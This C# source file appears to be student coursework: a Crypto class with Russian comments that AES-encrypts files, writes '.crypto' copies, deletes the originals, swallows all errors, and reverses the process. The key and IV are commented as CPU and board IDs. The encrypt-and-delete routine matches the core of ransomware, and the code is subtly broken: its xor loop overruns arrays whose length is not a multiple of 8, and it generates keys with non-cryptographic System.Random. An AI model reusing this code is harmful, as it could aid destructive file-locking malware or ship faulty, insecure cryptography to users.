using System;
using System.IO;
using System.Security.Cryptography;

namespace CourseWork
{
    public class Crypto {
        // максимальный размер файла для шифрования
        private const long MAX_FILE_SIZE = 10485760; // 10 MiB

        // сгенерировать ключ (N случайных байт)
        public static byte[] generateKey (int size)
        {
            var ret = new byte[size];
            new Random().NextBytes(ret);
            return ret;
        }

        // сделать xor с ключом
        public static byte[] xor (byte[] data, byte[] key)
        {
            var ret = new byte[data.Length];

            for (var i = 0; i < data.Length; i+=8)
            {
                ret[i] = (byte)(data[i] ^ key[i % key.Length]);
                ret[i+1] = (byte)(data[i+1] ^ key[(i + 1) % key.Length]);
                ret[i+2] = (byte)(data[i+2] ^ key[(i + 2) % key.Length]);
                ret[i+3] = (byte)(data[i+3] ^ key[(i + 3) % key.Length]);
                ret[i+4] = (byte)(data[i+4] ^ key[(i + 4) % key.Length]);
                ret[i+5] = (byte)(data[i+5] ^ key[(i + 5) % key.Length]);
                ret[i+6] = (byte)(data[i+6] ^ key[(i + 6) % key.Length]);
                ret[i+7] = (byte)(data[i+7] ^ key[(i + 7) % key.Length]);
            }
            
            return ret;
        }

        // Зашифровать файл
        public static void encryptFile (string file, byte[] key, byte[] iv)
        {
            // Проверка размера файла
            var info = new FileInfo(file);
            if (info.Length > MAX_FILE_SIZE) return;

            try
            {
                // Создание потоков: ввод file (оригинальный файл) и вывод file.crypto (зашифрованный файл)
                var input = File.OpenRead(file);
                var fileOutput = File.OpenWrite(file + ".crypto");

                // Создание менеджера шифрования
                var aes = new RijndaelManaged
                {
                    KeySize = 256,
                    BlockSize = 128,
                    Key = key, //CPU ID
                    Mode = CipherMode.CBC,
                    IV = iv //Board ID
                };

                // Поток для записи зашифрованного контента
                var cryptoOutput = new CryptoStream(fileOutput, aes.CreateEncryptor(), CryptoStreamMode.Write);
                // запись в этот поток
                input.CopyTo(cryptoOutput);

                // Закрытие всех потоков
                input.Close();
                cryptoOutput.Close();
                fileOutput.Close();

                // Удаление оригинального файла
                File.Delete(file);
            }
            catch (Exception) {}
        }

        // Расшифровать файл
        public static void decryptFile (string file, byte[] key, byte[] iv)
        {
            // Проверка расширения
            if (!file.EndsWith(".crypto")) return;

            // Создание потоков: file с зашифрованным контентом и file[:-7] без .crypto с расшифрованным контентом
            var fileInput = File.OpenRead(file);
            var fileOutput = File.OpenWrite(file.Substring(0, file.Length - 7));

            var aes = new RijndaelManaged {
                KeySize = 256,
                BlockSize = 128,
                Key = key, 
                Mode = CipherMode.CBC,
                IV = iv
            };

            // Поток с расшифрованным контентом
            var decryptedInput = new CryptoStream(fileInput, aes.CreateDecryptor(), CryptoStreamMode.Read);
            // Запись его в файл
            decryptedInput.CopyTo(fileOutput);

            // Закрыть потоки
            decryptedInput.Close();
            fileInput.Close();
            fileOutput.Close();

            // Удалить зашифрованный файл
            File.Delete(file);
        }
    }
}